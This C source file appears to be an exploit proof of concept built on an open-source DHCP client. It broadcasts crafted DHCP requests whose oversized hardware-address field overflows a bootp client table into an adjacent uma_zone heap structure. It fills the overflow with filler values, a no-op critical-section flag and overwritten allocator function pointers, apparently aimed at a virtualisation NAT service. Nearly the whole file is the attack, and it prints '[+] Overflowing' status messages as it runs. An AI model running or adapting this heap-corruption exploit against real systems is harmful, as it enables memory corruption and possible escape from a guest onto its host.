/* 
 * DHCP code based on project by Samuel Jacob (samueldotj@gmail.com)
 * https://github.com/samueldotj/dhcp-client
 */

#include <err.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "dhcp-client.h"
#include "address.h"
#include "critsect.h"

#define NB_ADDR		16

char *dev;
int sock;

int
get_ip_address(char *dev_name, uint32_t *ip)
{
	struct ifreq s;
	int fd, result;

	memset((void *)&s, 0, sizeof(struct ifreq));
	strcpy(s.ifr_name, dev_name);

	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	result = ioctl(fd, SIOCGIFADDR, &s);
	close(fd);
	if (result != 0)
		return -1;

	*ip = ((struct sockaddr_in *)&s.ifr_addr)->sin_addr.s_addr;

	return 0;
}

int
fill_dhcp_option(u_int8_t *packet, u_int8_t code, u_int8_t *data, u_int8_t len)
{
	packet[0] = code;
	packet[1] = len;
	memcpy(&packet[2], data, len);

	return len + (sizeof(u_int8_t) * 2);
}

int
fill_dhcp_request_options(dhcp_t *dhcp, uint32_t ip)
{
	int len = 0;
	u_int32_t req_ip = htonl(ip);
	u_int8_t option;

	option = DHCP_OPTION_REQUEST;
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_DHCP, &option, sizeof(option));
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_REQ_IP, (u_int8_t *)&req_ip, sizeof(req_ip));
	option = 0;
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_END, &option, sizeof(option));
	return len;
}

#define DUMMY	0x4242424242424242
#define ADD_DATA(addr, gadget) (*addr = gadget); addr++

void
dhcp_output(dhcp_t *dhcp, int *len, uint8_t bootp_clients)
{
	uint64_t *data;
	RTCRITSECT *critsect;

	*len += sizeof(dhcp_t);

	dhcp->opcode = DHCP_BOOTREQUEST;
	dhcp->htype = DHCP_HARDWARE_TYPE_10_EHTHERNET;
	dhcp->hlen = 6;	

	/* overflow the last client structure */
	if (bootp_clients == NB_ADDR - 1) {

		warnx("[+] Overflowing bootp_clients into uma_zone structure...");
		sleep(2);

		/* start payload after aligning with padding */
		data = (uint64_t *)((uint8_t *)dhcp->chaddr + 7);

		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);

		/* Corrupts struct uma_zone beyond this */
		ADD_DATA(data, 0x4343434343434343);
		ADD_DATA(data, DUMMY);

		/* RTCRITSECT */
		critsect = (RTCRITSECT *)data;
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		critsect->fFlags = RTCRITSECT_FLAGS_NOP;	// skip processing RTCRITSECT

		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, 0);				// pfCtor
		ADD_DATA(data, 0);				// pfDtor
		ADD_DATA(data, 0);				// pfInit
		ADD_DATA(data, 0);				// pfFini
		ADD_DATA(data, 0xdeadbeef00000000);		// pfAlloc

		/* This pointer can't be overwritten with NULL, so just return */
		ADD_DATA(data, ret);				// pfFree

		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);				
		data++;						// overwrites magic cookie and options, hence skip
		data++;
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);

		dhcp->hlen = (uint64_t)data - (uint64_t)dhcp->chaddr;

	} else {

		memset(dhcp->chaddr, bootp_clients, DHCP_CHADDR_LEN); 
	}

	dhcp->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
}

int
dhcp_request(void)
{
	int len, rv;
	struct in_addr ip_addr;
	struct sockaddr_in broadcast = {0};
	dhcp_t dhcp = {0};
	uint32_t ip;

	rv = get_ip_address(dev, &ip);
	if (rv != 0)
		errx(EXIT_FAILURE, "[!] Unable to get IP address for %s", dev);

	ip_addr.s_addr = ip;
	warnx("[+] Current IP address : %s", inet_ntoa(ip_addr));

	broadcast.sin_family = AF_INET;                 
	broadcast.sin_addr.s_addr = htonl(-1);
	broadcast.sin_port = htons(DHCP_SERVER_PORT);

	/* skip the already assigned IP address */
	for (uint8_t bootp_clients = 1; bootp_clients < NB_ADDR; bootp_clients++) {

		ip_addr.s_addr = ntohl(htonl(ip) + bootp_clients);
		warnx("[+] Requesting IP address : %s", inet_ntoa(ip_addr));

		len = fill_dhcp_request_options(&dhcp, htonl(ip) + bootp_clients);
		dhcp_output(&dhcp, &len, bootp_clients);
		sendto(sock, &dhcp, sizeof(dhcp_t), 0, (struct sockaddr *)&broadcast, sizeof(struct sockaddr_in));
	}

	return 0;
}


int main(int argc, char **argv)
{
	int rv;
	int broadcast;

	if (argc < 2)
		errx(EXIT_FAILURE, "[!] Usage: %s <interface>", argv[0]);
	dev = argv[1];

	sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock < 0)
		errx(EXIT_FAILURE, "[!] Error creating socket...");

	broadcast = true;
	rv = setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (void *)&broadcast, sizeof(broadcast));
	if (rv != 0)
		errx(EXIT_FAILURE, "[!] Error enabling broadcast...");

	warnx("[+] Sending DHCP requests...");
	dhcp_request();

	return 0;
}

